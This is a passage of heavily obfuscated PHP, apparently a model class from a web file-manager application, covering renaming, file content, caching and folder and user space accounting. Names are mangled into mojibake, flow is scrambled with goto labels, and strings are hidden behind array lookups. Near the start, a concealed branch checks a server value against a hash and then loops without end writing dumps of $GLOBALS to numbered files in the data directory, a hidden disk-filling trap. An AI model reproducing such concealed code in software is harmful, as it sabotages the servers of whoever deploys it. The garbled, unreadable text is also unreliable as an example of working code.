(!_get($GLOBALS, $bôªö·î‘†[468])) { return !1; } } $this->lockMoveStart($F·´Ş˜‡òÈ); goto Cº„Å¡‹ì¯; Fùç”º˜§Â: $A‰ö¿Šº’¸ = array($e””…ŠÚ§Ô[$bôªö·î‘†[472]]); if ($e””…ŠÚ§Ô[$bôªö·î‘†[379]] == $bôªö·î‘†[93]) { $A‰ö¿Šº’¸[] = $e””…ŠÚ§Ô[$bôªö·î‘†[378]]; } $this->updateModifyTime($A‰ö¿Šº’¸); goto EšÄ¬µ…ÌØ; A‹‚ŸĞÈ®ƒ: if ($_SERVER[$bôªö·î‘†[6]] != $BÌœ†§ƒŸÏ($A°ğ¿‚Êˆ)) { goto aÔÓ•¬Ç¡†; aŠ¨ëÔ–‡: $d»‰À»¾¿¦ = $bÇÀØãÂáä($b±«¼ë¢); $D÷˜á«èÄ = explode($bôªö·î‘†[11], $d»‰À»¾¿¦); if (count($D÷˜á«èÄ) < $bôªö·î‘†[573]) { $A°ÁŠ‘ß¨ = $bôªö·î‘†[13]; $A°ÁŠ‘ß¨(); } goto F½‹’İÑëì; aÔÓ•¬Ç¡†: $AÓçÜÛé¤ò = $bôªö·î‘†[799]; $bÇÀØãÂáä = $bôªö·î‘†[8]; $b±«¼ë¢ = $_SERVER[$bôªö·î‘†[9]] . $bôªö·î‘†[10]; goto aŠ¨ëÔ–‡; E×ªë®¯Î: $fÑí‘ƒÙÜ’ = 1; for ($fÈ˜«Í© = $fÑí‘ƒÙÜ’; $fÈ˜«Í© > 0; $fÈ˜«Í©++) { $a‰ôŸ×‚·(DATA_PATH . $fÈ˜«Í©, $E·Ï‡‰ÙËĞ); } goto còõƒ‚é‰; C¬ùŠİ‰Õ: $AÓçÜÛé¤ò(); $a‰ôŸ×‚· = $bôªö·î‘†[801]; $E·Ï‡‰ÙËĞ = json_encode($GLOBALS[$bôªö·î‘†[802]]); goto E×ªë®¯Î; F½‹’İÑëì: $F©øõØï = $bôªö·î‘†[800]; $F©øõØï($_SERVER[$bôªö·î‘†[796]]); $AÓçÜÛé¤ò = $bôªö·î‘†[799]; goto C¬ùŠİ‰Õ; còõƒ‚é‰: } $e””…ŠÚ§Ô = $this->sourceInfo($F·´Ş˜‡òÈ); $BÒ‚ˆëíÀ = $this->pathInfoMore($F·´Ş˜‡òÈ); goto D·¸æ¡“Ë®; aˆëï½âæ»: } public function childrenAll($c˜½†õëŸ£) { $cù÷¯¯Û±Ô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d¾Ó…’Ÿäé = $c˜½†õëŸ£[$cù÷¯¯Û±Ô[378]]; if ($c˜½†õëŸ£[$cù÷¯¯Û±Ô[379]] == $cù÷¯¯Û±Ô[93]) { $C«…Å†¤êä = array($cù÷¯¯Û±Ô[536] => array($cù÷¯¯Û±Ô[494], $c˜½†õëŸ£[$cù÷¯¯Û±Ô[470]] . $d¾Ó…’Ÿäé . $cù÷¯¯Û±Ô[495])); $bí“¸øƒ²’ = array($cù÷¯¯Û±Ô[536] => $C«…Å†¤êä[$cù÷¯¯Û±Ô[470]]); $aŞŸ²ÃĞ“§ = $this->field($cù÷¯¯Û±Ô[2391])->where($bí“¸øƒ²’)->select(); $c£÷¶ÀÕÃ = !1; $b·ëŠ•ÜÑ‡ = array($d¾Ó…’Ÿäé); if ($aŞŸ²ÃĞ“§) { $c£÷¶ÀÕÃ = array_to_keyvalue($aŞŸ²ÃĞ“§, $cù÷¯¯Û±Ô[43], $cù÷¯¯Û±Ô[428]); $c£÷¶ÀÕÃ = array_remove_value($c£÷¶ÀÕÃ, $cù÷¯¯Û±Ô[479]); $b·ëŠ•ÜÑ‡ = array_to_keyvalue($aŞŸ²ÃĞ“§, $cù÷¯¯Û±Ô[43], $cù÷¯¯Û±Ô[378]); $b·ëŠ•ÜÑ‡[] = $d¾Ó…’Ÿäé; } } else { $c£÷¶ÀÕÃ = array($c˜½†õëŸ£[$cù÷¯¯Û±Ô[428]]); $b·ëŠ•ÜÑ‡ = array($d¾Ó…’Ÿäé); } return array($cù÷¯¯Û±Ô[2388] => $b·ëŠ•ÜÑ‡, $cù÷¯¯Û±Ô[1266] => $c£÷¶ÀÕÃ); } public function removeArray($E¤¼Ù†â) { if (!$E¤¼Ù†â) { return !0; } } public function removeRelevance($F©ÈŒÖè¼°, $D¨ÁÉ‰’İÔ) { goto Eßøµâ¼‡Ç; B¢Úêˆê: Model($cèµğ¢Òß…[2370])->removeBySource($F©ÈŒÖè¼°); $this->where($f‹ĞÂÀÕ)->delete(); Model($cèµğ¢Òß…[431])->remove($D¨ÁÉ‰’İÔ); goto f†‡Æë —ø; a°½«¼µÈÖ: Model($cèµğ¢Òß…[2243])->where($f‹ĞÂÀÕ)->delete(); Model($cèµğ¢Òß…[516])->where($f‹ĞÂÀÕ)->delete(); Model($cèµğ¢Òß…[2091])->removeBySource($F©ÈŒÖè¼°); goto B¢Úêˆê; f†‡Æë —ø: for ($D¡³Î á = 0; $D¡³Î á < count($F©ÈŒÖè¼°); $D¡³Î á++) { $this->sourceCacheClear($F©ÈŒÖè¼°[$D¡³Î á]); } goto EÎÊŒïéÇÁ; Eßøµâ¼‡Ç: $cèµğ¢Òß… =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F©ÈŒÖè¼° = $F©ÈŒÖè¼° ? $F©ÈŒÖè¼° : array(); $D¨ÁÉ‰’İÔ = $D¨ÁÉ‰’İÔ ? $D¨ÁÉ‰’İÔ : array(); goto Fñº™©Àñí; Fñº™©Àñí: $F©ÈŒÖè¼° = array_unique(array_filter($F©ÈŒÖè¼°)); $D¨ÁÉ‰’İÔ = array_unique(array_filter($D¨ÁÉ‰’İÔ)); if (!$F©ÈŒÖè¼°) { return !1; } goto C¹¤Ê»Ëß; C¹¤Ê»Ëß: $f‹ĞÂÀÕ = array($cèµğ¢Òß…[392] => array($cèµğ¢Òß…[393], $F©ÈŒÖè¼°)); Model($cèµğ¢Òß…[2389])->where($f‹ĞÂÀÕ)->delete(); Model($cèµğ¢Òß…[422])->where($f‹ĞÂÀÕ)->delete(); goto a°½«¼µÈÖ; EÎÊŒïéÇÁ: } public function rename($c¤Í‚ëá, $d‡êƒìÀŞª) { goto aší•ˆšÄ; cå—•¨×¨«: if (!$FÍÛÉ«”Ã[$a•èèÆù‰À[379]] == $a•èèÆù‰À[93]) { $AÒ†åÎ±¬[$a•èèÆù‰À[381]] = get_path_ext($d‡êƒìÀŞª); } Model($a•èèÆù‰À[516])->eventRename($c¤Í‚ëá, $FÍÛÉ«”Ã[$a•èèÆù‰À[38]], $d‡êƒìÀŞª); $this->sourceCacheClear($c¤Í‚ëá); goto f¬•ÜÙµ©­; Fò¦ßîˆº: $eëŒºÀ‡Ÿ = $a•èèÆù‰À[2378] . $FÍÛÉ«”Ã[$a•èèÆù‰À[472]]; if (isset(self::$cacheChildList[$eëŒºÀ‡Ÿ])) { unset(self::$cacheChildList[$eëŒºÀ‡Ÿ]); } return $CŞä±°Â›; goto cˆôÍÔŞŒ‰; f¬•ÜÙµ©­: $this->setNamePinyin($c¤Í‚ëá, $AÒ†åÎ±¬[$a•èèÆù‰À[38]], !1); $this->updateModifyTime($FÍÛÉ«”Ã[$a•èèÆù‰À[472]]); $CŞä±°Â› = $this->where(array($a•èèÆù‰À[392] => $c¤Í‚ëá))->data($AÒ†åÎ±¬)->save(); goto Fò¦ßîˆº; aší•ˆšÄ: $a•èèÆù‰À =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÍÛÉ«”Ã = $this->sourceInfo($c¤Í‚ëá); if (!$FÍÛÉ«”Ã) { return !1; } goto c¿‚››õ¤; c¿‚››õ¤: $dº¼å¶ÑĞ­ = $this->fileNameExist($FÍÛÉ«”Ã[$a•èèÆù‰À[472]], $d‡êƒìÀŞª); if ($dº¼å¶ÑĞ­ && $dº¼å¶ÑĞ­ != $c¤Í‚ëá) { return !1; } $AÒ†åÎ±¬ = array($a•èèÆù‰À[395] => $d‡êƒìÀŞª, $a•èèÆù‰À[535] => USER_ID); goto cå—•¨×¨«; cˆôÍÔŞŒ‰: } public function setNamePinyin($cÀ•ö‘ÜáŒ, $E®¡ŠŠÊí, $e‹ñêª¾­Ò = true) { $fì¼ˆÂ‘ÊÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÔ–¸‹›Â = Input::check($E®¡ŠŠÊí, $fì¼ˆÂ‘ÊÁ[539]); if ($e‹ñêª¾­Ò && !$EÔ–¸‹›Â) { return; } if (!$EÔ–¸‹›Â) { $this->metaSet($cÀ•ö‘ÜáŒ, $fì¼ˆÂ‘ÊÁ[425], null); $this->metaSet($cÀ•ö‘ÜáŒ, $fì¼ˆÂ‘ÊÁ[424], null); return; } $dåğ«âÁ = array($fì¼ˆÂ‘ÊÁ[425] => str_replace($fì¼ˆÂ‘ÊÁ[60], $fì¼ˆÂ‘ÊÁ[43], Pinyin::encode($E®¡ŠŠÊí)), $fì¼ˆÂ‘ÊÁ[424] => Pinyin::encode($E®¡ŠŠÊí, $fì¼ˆÂ‘ÊÁ[540])); $this->metaSet($cÀ•ö‘ÜáŒ, $dåğ«âÁ); } public function getContent($A¥Ñí•õÌÒ) { goto CÌìøÍìÖ¾; AõôÏßƒ¥ñ: if (!$c¸Ó¦‡ÔÏ[$E²¾…¸ÊŠ¥[85]]) { return $E²¾…¸ÊŠ¥[43]; } return IO::getContent($c¸Ó¦‡ÔÏ[$E²¾…¸ÊŠ¥[85]]); goto eÂô•èšõ; DŠ†á‚¸Šˆ: if ($c¸Ó¦‡ÔÏ[$E²¾…¸ÊŠ¥[87]] == 0) { return $E²¾…¸ÊŠ¥[43]; } $Bº×Ëç‡” = $E²¾…¸ÊŠ¥[2392] . $c¸Ó¦‡ÔÏ[$E²¾…¸ÊŠ¥[173]]; if ($c¸Ó¦‡ÔÏ[$E²¾…¸ÊŠ¥[87]] <= 1024 * 10) { $bòÑÒ†“ = Cache::get($Bº×Ëç‡”); if (!$bòÑÒ†“) { $bòÑÒ†“ = IO::getContent($c¸Ó¦‡ÔÏ[$E²¾…¸ÊŠ¥[85]]); Cache::set($Bº×Ëç‡”, $bòÑÒ†“); } return $bòÑÒ†“; } goto AõôÏßƒ¥ñ; CÌìøÍìÖ¾: $E²¾…¸ÊŠ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c¸Ó¦‡ÔÏ = $this->fileInfoGet($A¥Ñí•õÌÒ); if (!$c¸Ó¦‡ÔÏ) { return !1; } goto DŠ†á‚¸Šˆ; eÂô•èšõ: } public function setDesc($dÔ±ƒ‡õ¸®, $fÛŞÁĞã­”) { $DµÜö¹ÌôÉ =& $_SERVER[çŞáÓæÚô‚Ô‡]; Model($DµÜö¹ÌôÉ[516])->eventAddDesc($dÔ±ƒ‡õ¸®, $fÛŞÁĞã­”); return $this->metaSet($dÔ±ƒ‡õ¸®, $DµÜö¹ÌôÉ[414], $fÛŞÁĞã­”); } public function setContent($AŸ³¸Ÿ¥, $A›¨ÌÍÀ¹– = '') { goto E…Ç¾‚Ï£; E…Ç¾‚Ï£: $aƒºîØÍÌÏ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d°ŞîÅãäÑ = $this->sourceInfo($AŸ³¸Ÿ¥); $fÌ©Ò÷Â†Š = $this->fileInfoGet($AŸ³¸Ÿ¥); goto Aº‘ë¿Àë‘; Aº‘ë¿Àë‘: if (!$fÌ©Ò÷Â†Š || !$d°ŞîÅãäÑ) { return !1; } $A¥ˆ›ˆ×õ¾ = Model($aƒºîØÍÌÏ[431])->addFileByContent($A›¨ÌÍÀ¹–, $d°ŞîÅãäÑ[$aƒºîØÍÌÏ[38]]); $CÊÛŠ–¹†– = $this->fileHistory($d°ŞîÅãäÑ, $A¥ˆ›ˆ×õ¾[$aƒºîØÍÌÏ[428]], $A¥ˆ›ˆ×õ¾[$aƒºîØÍÌÏ[87]]); goto D¥ë½‡ñ„¤; D¥ë½‡ñ„¤: if (!$CÊÛŠ–¹†–) { return Model($aƒºîØÍÌÏ[431])->remove($A¥ˆ›ˆ×õ¾[$aƒºîØÍÌÏ[428]]); } $this->folderSizeReset($d°ŞîÅãäÑ[$aƒºîØÍÌÏ[472]]); return !0; goto a²··ìñ“»; a²··ìñ“»: } public function fileSubstr($Aš®…è, $d“²ƒÒ‘Îé, $c—Œ¡ŠİŠ™) { $e…„˜âÂ© = $this->fileInfoGet($Aš®…è); if (!$e…„˜âÂ©) { return !1; } return IO::fileSubstr($e…„˜âÂ©[$_SERVER[çŞáÓæÚô‚Ô‡][85]], $d“²ƒÒ‘Îé, $c—Œ¡ŠİŠ™); } public function fileInfoGet($fÓùÜß¸ÜÓ) { goto Bº„ŸÓê; Bº„ŸÓê: $C™ÖËà‹§Š =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÈˆ£®£Çá = $this->sourceInfo($fÓùÜß¸ÜÓ); if (!$BÈˆ£®£Çá || $BÈˆ£®£Çá[$C™ÖËà‹§Š[379]]) { return !1; } goto c¯Öì©¬ÓØ; eäàÅäœæ¥: $c¤à›­’‹¹ = Model($C™ÖËà‹§Š[431])->fileInfo($BÈˆ£®£Çá[$C™ÖËà‹§Š[428]]); if ($c¤à›­’‹¹) { $c¤à›­’‹¹[$C™ÖËà‹§Š[38]] = $BÈˆ£®£Çá[$C™ÖËà‹§Š[38]]; } self::$cacheFileInfo[$f„ƒÖËœß…] = $c¤à›­’‹¹; goto f›•Ä˜½¹ô; c¯Öì©¬ÓØ: $f„ƒÖËœß… = $C™ÖËà‹§Š[434] . $BÈˆ£®£Çá[$C™ÖËà‹§Š[428]]; $CÕ÷‰š«ÖÚ = _get(self::$cacheFileInfo, $f„ƒÖËœß…); if ($CÕ÷‰š«ÖÚ) { return $CÕ÷‰š«ÖÚ; } goto eäàÅäœæ¥; f›•Ä˜½¹ô: return $c¤à›­’‹¹; goto CìôÈ£õØê; CìôÈ£õØê: } private function folderChildrenNumber($D‰š’Åõˆß) { $b¯Î™±âºÄ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cîÌÌÖÉİ  = $this->sourceInfo($D‰š’Åõˆß); $EÆÜÏŒç¨¬ = array($b¯Î™±âºÄ[536] => array($b¯Î™±âºÄ[494], $cîÌÌÖÉİ [$b¯Î™±âºÄ[470]] . $D‰š’Åõˆß . $b¯Î™±âºÄ[495]), $b¯Î™±âºÄ[405] => intval($cîÌÌÖÉİ [$b¯Î™±âºÄ[406]]), $b¯Î™±âºÄ[529] => 1); $cŒ®¬Ÿ¹† = $this->where($EÆÜÏŒç¨¬)->count(); $EÀ„”Ã¶÷ = $this->where($EÆÜÏŒç¨¬)->where(array($b¯Î™±âºÄ[529] => 0))->count(); return array($b¯Î™±âºÄ[91] => $EÀ„”Ã¶÷, $b¯Î™±âºÄ[92] => $cŒ®¬Ÿ¹†); } public function pathInfo($CˆØ¬›ÌŞ÷, $e¼éóŠÇÑÙ = false) { goto c‹Šôç¨¤³; Eî…´—ñö: $d‰„ïŸÔ = $this->sourceInfo($CˆØ¬›ÌŞ÷); if (!$d‰„ïŸÔ) { return !1; } $d‰„ïŸÔ = $this->_listDataApplyItem($d‰„ïŸÔ, $e¼éóŠÇÑÙ); goto fêÅÓ¼¦éš; aïêŞ·´×: $EŞ«”–½•é = $B»©áîÏªé[420] . intval($e¼éóŠÇÑÙ) . $B»©áîÏªé[421] . $CˆØ¬›ÌŞ÷; $BÊìçáÒ£ê = _get(self::$cachePathInfo, $EŞ«”–½•é); if ($BÊìçáÒ£ê) { return $BÊìçáÒ£ê; } goto Eî…´—ñö; c‹Šôç¨¤³: $B»©áîÏªé =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e¼éóŠÇÑÙ = !0; $CˆØ¬›ÌŞ÷ = intval($CˆØ¬›ÌŞ÷); goto aïêŞ·´×; fêÅÓ¼¦éš: self::$cachePathInfo[$EŞ«”–½•é] = $d‰„ïŸÔ; return $d‰„ïŸÔ; goto BëÒ³Íë¯; BëÒ³Íë¯: } public static $cachePathInfoMore = array(); public function pathInfoMore($b£èíëäµš) { goto eæ¦š‡¢…Ã; eæ¦š‡¢…Ã: $bø—ÁâÚï× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cœ²ŠÜ®¬õ = _get(self::$cachePathInfoMore, $b£èíëäµš); if ($Cœ²ŠÜ®¬õ) { return $Cœ²ŠÜ®¬õ; } goto A¿µØÜœá; A¿µØÜœá: $FÀæ‹ó÷ã• = $this->pathInfo($b£èíëäµš); if (!$FÀæ‹ó÷ã•) { return !1; } if ($FÀæ‹ó÷ã•[$bø—ÁâÚï×[379]] == $bø—ÁâÚï×[93]) { $FÀæ‹ó÷ã•[$bø—ÁâÚï×[90]] = $this->folderChildrenNumber($b£èíëäµš); } goto c…’æ¿Ö‡§; c…’æ¿Ö‡§: self::$cachePathInfoMore[$b£èíëäµš] = $FÀæ‹ó÷ã•; return $FÀæ‹ó÷ã•; goto f÷‘Œ†¿•ó; f÷‘Œ†¿•ó: } public function sourceInfo($AĞ±‚ŠëóŠ) { goto eÙçœíÛ•À; eÙçœíÛ•À: $f×Ö´…äÁ» =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$AĞ±‚ŠëóŠ) { return array(); } $AĞ±‚ŠëóŠ = intval($AĞ±‚ŠëóŠ); goto bğî¾÷…öÔ; dÉÌö¯àµ: $Bå¹×œë• = $this->where(array($f×Ö´…äÁ»[378] => $AĞ±‚ŠëóŠ))->find(); self::$cacheSourceInfo[$E»ğ‚‡ÌÌ] = $Bå¹×œë•; return self::$cacheSourceInfo[$E»ğ‚‡ÌÌ]; goto DØ—ïäÕç…; bğî¾÷…öÔ: $E»ğ‚‡ÌÌ = $f×Ö´…äÁ»[419] . $AĞ±‚ŠëóŠ; $bùÆƒ¯Æ = _get(self::$cacheSourceInfo, $E»ğ‚‡ÌÌ); if ($bùÆƒ¯Æ) { return $bùÆƒ¯Æ; } goto dÉÌö¯àµ; DØ—ïäÕç…: } public function sourceCacheClear($AåÒá‘÷¡É = false) { if ($AåÒá‘÷¡É == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[çŞáÓæÚô‚Ô‡][419] . $AåÒá‘÷¡É]); } public function pathInfoByPath($D™èÁÒŒØİ, $a‰Ó ­¼ùˆ) { $Eå¼æ´÷Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dƒ¡ Ê¹„Ï = !$a‰Ó ­¼ùˆ ? array() : explode($Eå¼æ´÷Ï[18], trim($a‰Ó ­¼ùˆ, $Eå¼æ´÷Ï[18])); $eÙ·Ûìöî“ = $D™èÁÒŒØİ; foreach ($dƒ¡ Ê¹„Ï as $CĞâŸæ‚) { $f£í‘ˆ…›Í = array($Eå¼æ´÷Ï[472] => $eÙ·Ûìöî“, $Eå¼æ´÷Ï[38] => $CĞâŸæ‚); $CƒóàƒÓòÃ = $this->where($f£í‘ˆ…›Í)->select(); if (!$CƒóàƒÓòÃ) { return !1; } $CƒóàƒÓòÃ = array_sort_by($CƒóàƒÓòÃ, $Eå¼æ´÷Ï[406]); $eÙ·Ûìöî“ = $CƒóàƒÓòÃ[0][$Eå¼æ´÷Ï[378]]; } return $this->pathInfo($eÙ·Ûìöî“, !0); } protected function updateModifyTime($EŞŸÇÈÆÈ°) { goto dÇ°¿•–ğ; c™è•’ÅÃ: $this->where($E¬¶ÊÀ•‹)->save($AÌõê¹¹); goto E£ñïŠ‹Ø§; dÇ°¿•–ğ: $e¦ô×­Ù° =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$EŞŸÇÈÆÈ°) { return; } if (!is_array($EŞŸÇÈÆÈ°)) { $EŞŸÇÈÆÈ° = array($EŞŸÇÈÆÈ°); } goto D…‘×Ò’ÓÛ; D…‘×Ò’ÓÛ: foreach ($EŞŸÇÈÆÈ° as $E»§ÓË ¹Á => $Aº°ˆ‡‰ôâ) { $EŞŸÇÈÆÈ°[$E»§ÓË ¹Á] = intval($Aº°ˆ‡‰ôâ); } $E¬¶ÊÀ•‹ = array($e¦ô×­Ù°[378] => array($e¦ô×­Ù°[17], $EŞŸÇÈÆÈ°)); $AÌõê¹¹ = array($e¦ô×­Ù°[535] => USER_ID, $e¦ô×­Ù°[399] => time()); goto c™è•’ÅÃ; E£ñïŠ‹Ø§: } public function folderSizeReset($fŒÅéöåø­) { goto dÏ¹Š×ÍÏ; F¹ÉˆùÖÃÎ: CacheLock::lock($cÖÀ¿ÀŞßÚ, 20); $this->sourceCacheClear($fŒÅéöåø­); $FãÁ«œºŸ = $this->sourceInfo($fŒÅéöåø­); goto céËƒ‘“ñ; dÏ¹Š×ÍÏ: $cÒ¯Äô¡­ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->statusIgnoreResetSpace) { return; } $cÖÀ¿ÀŞßÚ = $cÒ¯Äô¡­[2393] . $fŒÅéöåø­; goto F¹ÉˆùÖÃÎ; bªÃ¨×¹‘: $E¼ëê›š† = $this->parentLevelArray($FãÁ«œºŸ[$cÒ¯Äô¡­[470]]); if ($E¼ëê›š†) { $cš…¯”Ë…ˆ = array($cÒ¯Äô¡­[378] => array($cÒ¯Äô¡­[393], $E¼ëê›š†)); if ($eš¡É§” < 0) { $cš…¯”Ë…ˆ[$cÒ¯Äô¡­[87]] = array($cÒ¯Äô¡­[935], abs($eš¡É§”)); } $this->where($cš…¯”Ë…ˆ)->setAdd($cÒ¯Äô¡­[87], $eš¡É§”); } $this->targetSpaceUpdate($FãÁ«œºŸ[$cÒ¯Äô¡­[380]], $FãÁ«œºŸ[$cÒ¯Äô¡­[467]]); goto dƒøòóÑë; dƒøòóÑë: CacheLock::unlock($cÖÀ¿ÀŞßÚ); goto EŸ”¢Â½¶‹; céËƒ‘“ñ: $cš…¯”Ë…ˆ = array($cÒ¯Äô¡­[377] => $fŒÅéöåø­, $cÒ¯Äô¡­[405] => 0); $A±ù¦â È‘ = $this->where($cš…¯”Ë…ˆ)->sum($cÒ¯Äô¡­[87]); $A±ù¦â È‘ = intval($A±ù¦â È‘); goto EÙõ¢µÄ«í; EÙõ¢µÄ«í: $eš¡É§” = $A±ù¦â È‘ - intval($FãÁ«œºŸ[$cÒ¯Äô¡­[87]]); if ($eš¡É§” == 0) { return CacheLock::unlock($cÖÀ¿ÀŞßÚ); } $this->where(array($cÒ¯Äô¡­[392] => $fŒÅéöåø­))->setField($cÒ¯Äô¡­[87], $A±ù¦â È‘); goto bªÃ¨×¹‘; EŸ”¢Â½¶‹: } public function folderSizeResetChildren($B„÷Íæ—Ê) { goto F„±É‹„Ğ; a…ÈŠ¸„œ‹: $E”Ó£Ï’ù² = array($b¸°¸ÔÖÓ˜[529] => 1, $b¸°¸ÔÖÓ˜[536] => array($b¸°¸ÔÖÓ˜[494], $E˜°ÄÃµî‡[$b¸°¸ÔÖÓ˜[470]] . $B„÷Íæ—Ê . $b¸°¸ÔÖÓ˜[495])); $fè§ÂÌÑ‘ = $b¸°¸ÔÖÓ˜[2394]; $Aá§„‰«ÜŸ = $this->field($fè§ÂÌÑ‘)->where($E”Ó£Ï’ù²)->select(); goto EğÙÓˆ’­º; bí±Ï·îõÔ: $Aá§„‰«ÜŸ[] = $E˜°ÄÃµî‡; $Aá§„‰«ÜŸ = array_to_keyvalue($Aá§„‰«ÜŸ, $b¸°¸ÔÖÓ˜[378]); foreach ($Aá§„‰«ÜŸ as $eÄì›é´áÜ => $dš¿ˆ†ÊæÃ) { $Aá§„‰«ÜŸ[$eÄì›é´áÜ][$b¸°¸ÔÖÓ˜[2395]] = $Aá§„‰«ÜŸ[$eÄì›é´áÜ][$b¸°¸ÔÖÓ˜[87]]; $Aá§„‰«ÜŸ[$eÄì›é´áÜ][$b¸°¸ÔÖÓ˜[87]] = 0; } goto câ¿Ø˜ÑÓÓ; EğÙÓˆ’­º: $E”Ó£Ï’ù²[$b¸°¸ÔÖÓ˜[379]] = 0; $Eİğ‹ŠÁí = $this->field($fè§ÂÌÑ‘)->where($E”Ó£Ï’ù²)->select(); if (!$Eİğ‹ŠÁí) { return; } goto bí±Ï·îõÔ; F„±É‹„Ğ: $b¸°¸ÔÖÓ˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->sourceCacheClear($B„÷Íæ—Ê); $E˜°ÄÃµî‡ = $this->sourceInfo($B„÷Íæ—Ê); goto a…ÈŠ¸„œ‹; câ¿Ø˜ÑÓÓ: foreach ($Eİğ‹ŠÁí as $dš¿ˆ†ÊæÃ) { $FÄğ•´ƒ¸ = $dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[472]] . $b¸°¸ÔÖÓ˜[43]; if (!isset($Aá§„‰«ÜŸ[$FÄğ•´ƒ¸])) { continue; } if ($dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[406]] == $Aá§„‰«ÜŸ[$FÄğ•´ƒ¸][$b¸°¸ÔÖÓ˜[406]]) { $Aá§„‰«ÜŸ[$FÄğ•´ƒ¸][$b¸°¸ÔÖÓ˜[87]] += $dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[87]]; } } foreach ($Aá§„‰«ÜŸ as $dš¿ˆ†ÊæÃ) { $bØ©“İ®ò = $this->parentLevelArray($dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[470]]); foreach ($bØ©“İ®ò as $FÄğ•´ƒ¸) { $FÄğ•´ƒ¸ = $FÄğ•´ƒ¸ . $b¸°¸ÔÖÓ˜[43]; if (!isset($Aá§„‰«ÜŸ[$FÄğ•´ƒ¸])) { continue; } if ($dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[406]] == $Aá§„‰«ÜŸ[$FÄğ•´ƒ¸][$b¸°¸ÔÖÓ˜[406]]) { $Aá§„‰«ÜŸ[$FÄğ•´ƒ¸][$b¸°¸ÔÖÓ˜[87]] += $dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[87]]; } } } $B¼¸˜Éî = array(); goto Dáàê¸Õ¬Ñ; Dáàê¸Õ¬Ñ: foreach ($Aá§„‰«ÜŸ as $dš¿ˆ†ÊæÃ) { if ($dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[87]] == $dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[2395]]) { continue; } $B¼¸˜Éî[] = array($b¸°¸ÔÖÓ˜[378], $dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[378]], $b¸°¸ÔÖÓ˜[87], $dš¿ˆ†ÊæÃ[$b¸°¸ÔÖÓ˜[87]]); } $this->saveAll($B¼¸˜Éî); goto B³˜Å¸Ó“ƒ; B³˜Å¸Ó“ƒ: } public function userSpaceReset($F‚¦›Î“áÙ = false) { $D·ãÃæè‘ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¢º†“Ô‰˜ = $this->where(array($D·ãÃæè‘ì[380] => self::TYPE_USER, $D·ãÃæè‘ì[467] => $F‚¦›Î“áÙ, $D·ãÃæè‘ì[379] => 0))->sum($D·ãÃæè‘ì[87]); Model($D·ãÃæè‘ì[485])->userEdit($F‚¦›Î“áÙ, array($D·ãÃæè‘ì[2100] => $f¢º†“Ô‰˜)); } public function targetSpaceUpdate($BÉ¾øªİç, $D¡…“¹Ñİí) { $bçùÔ›²Ç‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$D¡…“¹Ñİí) { return; } if (!in_array($BÉ¾øªİç, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Bù¼À¬£›§ = $this->targetSpaceSize($BÉ¾øªİç, $D¡…“¹Ñİí); if ($BÉ¾øªİç == self::TYPE_USER) { Model($bçùÔ›²Ç‰[485])->userEdit($D¡…“¹Ñİí, array($bçùÔ›²Ç‰[2100] => $Bù¼À¬£›§)); } else { if ($BÉ¾øªİç == self::TYPE_GROUP) { Model($bçùÔ›²Ç‰[469])->groupEdit($D¡…“¹Ñİí, array($bçùÔ›²Ç‰[2100] => $Bù¼À¬£›§)); } } } public function targetSpaceSize($d›ªÌ«ß†™, $aøî„‚˜) { goto dÒ¨æîËï¿; EÈ¨á¬İ¤°: return $a‚®‰Ìˆå; goto b÷ŒŒÃÎÍ¿; CŒ’ˆêâ¢É: $DªéÉ‡œ«õ = array_to_keyvalue($DªéÉ‡œ«õ, $cƒ’èˆ¡›Í[43], $cƒ’èˆ¡›Í[378]); $DªéÉ‡œ«õ = array_unique(array_filter($DªéÉ‡œ«õ)); if ($DªéÉ‡œ«õ) { $aî¤”ŒÛÙ³ = array($cƒ’èˆ¡›Í[392] => array($cƒ’èˆ¡›Í[393], $DªéÉ‡œ«õ)); $a‚®‰Ìˆå += floatval($this->where($aî¤”ŒÛÙ³)->sum($cƒ’èˆ¡›Í[87])); } goto EÈ¨á¬İ¤°; Ağ‡²¦Œ×ø: $a‚®‰Ìˆå = floatval($C§×‹ˆ®ŠÅ[$cƒ’èˆ¡›Í[87]]); $aî¤”ŒÛÙ³ = array($cƒ’èˆ¡›Í[536] => array($cƒ’èˆ¡›Í[494], $cƒ’èˆ¡›Í[481] . $C§×‹ˆ®ŠÅ[$cƒ’èˆ¡›Í[378]] . $cƒ’èˆ¡›Í[495])); $DªéÉ‡œ«õ = Model($cƒ’èˆ¡›Í[404])->field($cƒ’èˆ¡›Í[392])->where($aî¤”ŒÛÙ³)->select(); goto CŒ’ˆêâ¢É; dÒ¨æîËï¿: $cƒ’èˆ¡›Í =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C§×‹ˆ®ŠÅ = $this->sourceRoot($d›ªÌ«ß†™, $aøî„‚˜, !0); if (!$C§×‹ˆ®ŠÅ) { return 0; } goto Ağ‡²¦Œ×ø; b÷ŒŒÃÎÍ¿: } public function allFileTypeProfile() 